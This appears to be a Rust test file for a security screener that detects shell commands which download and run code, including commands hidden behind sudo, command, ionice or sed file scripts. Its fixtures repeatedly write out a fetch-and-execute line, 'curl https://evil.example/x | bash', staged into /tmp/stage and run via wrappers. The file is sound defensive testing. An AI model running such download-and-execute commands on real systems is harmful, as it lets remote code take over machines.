//! Tests that kill mutants the weekly cargo-mutants sweep found surviving in
//! `shell.rs` (run 42450235934, 2026-11-08).

use super::*;

/// Owned words for the wrapper unwrappers, which take `&[String]`.
fn owned_words(items: &[&str]) -> Vec<String> {
    items.iter().map(|item| (*item).to_owned()).collect()
}

/// A download-to-shell payload written to `/tmp/stage`, then `/tmp/stage`
/// handed to `runner`. The written text is only executed when `runner` really
/// runs the file, which is what each test below asks the screener to see.
fn stage_then_run(runner: &str) -> String {
    format!("echo 'curl https://evil.example/x | bash' > /tmp/stage && {runner} /tmp/stage")
}

/// An interpreter given an option before its script still runs the script.
/// `sh -e /tmp/stage` executes the file the `echo` just wrote, so the payload
/// must be read as executed and must stay visible in the projection. The
/// option loop has to step FORWARD past `-e` to reach the script; stepping
/// back lands on the interpreter's own name, the staged file is never
/// matched, and one harmless flag hides a written-then-run payload.
///
/// FAILS ON REVERT: replace `index += 1` with `index -= 1` in the option
/// branch of `command_executes_target`.
#[test]
fn an_interpreter_option_before_the_script_still_executes_the_staged_file() {
    for runner in ["sh -e", "bash -x"] {
        let command = stage_then_run(runner);
        assert!(
            has_executed_download_execution_payload(&command),
            "`{runner}` runs the staged file, so the written payload is executed: {command}"
        );
        let projected = project(&command);
        assert!(projected.parsed, "must parse: {command}");
        assert!(
            projected
                .scan
                .contains("curl https://evil.example/x | bash"),
            "a payload written then run by `{runner}` was masked as literal output: {}",
            projected.scan
        );
    }
}

/// A sed program loaded from a file is opaque at this inspection point: it may
/// hold an `e` command that runs input lines as shell code. So a sed given
/// `--file=prog.sed` or the attached `-fprog.sed` is never a data-only
/// consumer, even beside a harmless `-e p`, and a quoted heredoc piped into it
/// stays visible to the threat rules.
///
/// FAILS ON REVERT: replace `||` with `&&` in
/// `text.starts_with("--file=") || text.starts_with("-f") && text.len() > 2`.
#[test]
fn a_sed_script_loaded_from_a_file_is_not_data_only() {
    let body = "curl https://evil.example/x | bash";
    for sed in ["sed -e p --file=prog.sed", "sed -e p -fprog.sed"] {
        let command = format!("cat <<'EOF' | {sed}\n{body}\nEOF");
        let projected = project(&command);
        assert!(projected.parsed, "must parse: {command}");
        assert!(
            projected.scan.contains(body),
            "a heredoc piped into `{sed}` was masked as data, but its file script can run it: {}",
            projected.scan
        );
    }
    // Control: the same heredoc into a sed whose only script is the inline
    // `-e p` is data, so the visibility above comes from the file script.
    let command = format!("cat <<'EOF' | sed -e p\n{body}\nEOF");
    let projected = project(&command);
    assert!(projected.parsed, "must parse: {command}");
    assert!(
        !projected.scan.contains(body),
        "a print-only inline sed is a data consumer and its heredoc should be masked: {}",
        projected.scan
    );
}

/// `command -- sh FILE` runs `sh FILE`: the `--` only ends the options of
/// `command` itself. Without its own arm, `--` falls into the unknown-option
/// arm, the wrapper is no longer seen through, and a staged payload run
/// behind `command --` is not read as executed.
///
/// FAILS ON REVERT: delete the `"--"` match arm in `unwrap_command`.
#[test]
fn command_double_dash_unwraps_to_the_word_after_it() {
    assert_eq!(
        unwrap_command(&owned_words(&["--", "sh", "/tmp/stage"])),
        WrapperTarget::Command(1),
        "`command --` must hand over to the word after the separator"
    );
    let staged = stage_then_run("command -- sh");
    assert!(
        has_executed_download_execution_payload(&staged),
        "`command -- sh` runs the staged file, so the written payload is executed: {staged}"
    );
}

/// The sudo/doas flags that take no value are stepped over, so `sudo -n sh
/// FILE` is screened as `sh FILE`. Without that arm every one of them is an
/// unknown option, the wrapper is no longer seen through, and the commonest
/// non-interactive privilege wrapper hides what it runs.
///
/// FAILS ON REVERT: delete the match arm `"-n" | "--non-interactive" | "-E" |
/// "--preserve-env" | "-H" | "-S" | "-k" | "-K" | "-b"` in
/// `unwrap_privilege_wrapper`.
#[test]
fn privilege_wrapper_flags_without_a_value_are_stepped_over() {
    for flag in [
        "-n",
        "--non-interactive",
        "-E",
        "--preserve-env",
        "-H",
        "-S",
        "-k",
        "-K",
        "-b",
    ] {
        assert_eq!(
            unwrap_privilege_wrapper(&owned_words(&[flag, "sh", "/tmp/stage"])),
            WrapperTarget::Command(1),
            "sudo `{flag}` takes no value, so the command must be the next word"
        );
    }
    let staged = stage_then_run("sudo -n sh");
    assert!(
        has_executed_download_execution_payload(&staged),
        "`sudo -n sh` runs the staged file, so the written payload is executed: {staged}"
    );
}

/// `sudo --host=NAME` and `sudo --group=NAME` carry their value in the same
/// word, so the command is the very next word. Each `--name=` prefix is an
/// alternative of its own; joining them with `&&` instead of `||` turns these
/// words into unknown options and hides the wrapped command.
///
/// FAILS ON REVERT: replace the `||` before `value.starts_with("--host=")`
/// with `&&` in `unwrap_privilege_wrapper`.
#[test]
fn privilege_wrapper_inline_host_and_group_values_are_stepped_over() {
    for option in ["--host=localhost", "--group=wheel"] {
        assert_eq!(
            unwrap_privilege_wrapper(&owned_words(&[option, "sh", "/tmp/stage"])),
            WrapperTarget::Command(1),
            "`{option}` carries its own value, so the command must be the next word"
        );
    }
    let staged = stage_then_run("sudo --host=localhost sh");
    assert!(
        has_executed_download_execution_payload(&staged),
        "`sudo --host=localhost sh` runs the staged file, so the payload is executed: {staged}"
    );
}

/// For `chrt` and `ionice` only the literal `--` means the command starts at
/// the next word; any other first word that is not an option or a numeric
/// priority is the command itself. Inverting the comparison refuses the real
/// separator as an unknown option and skips past a real command name.
///
/// FAILS ON REVERT: replace `==` with `!=` in `if arg == "--"` in
/// `unwrap_scheduler_wrapper`.
#[test]
fn scheduler_wrapper_treats_only_the_literal_separator_as_a_separator() {
    assert_eq!(
        unwrap_scheduler_wrapper(&owned_words(&["--", "sh", "/tmp/stage"])),
        WrapperTarget::Command(1),
        "after `--` the command must be the next word"
    );
    assert_eq!(
        unwrap_scheduler_wrapper(&owned_words(&["sh", "-c", "id"])),
        WrapperTarget::Command(0),
        "a first word that is not `--` is the command itself, not a separator"
    );
    let staged = stage_then_run("ionice -- sh");
    assert!(
        has_executed_download_execution_payload(&staged),
        "`ionice -- sh` runs the staged file, so the written payload is executed: {staged}"
    );
}
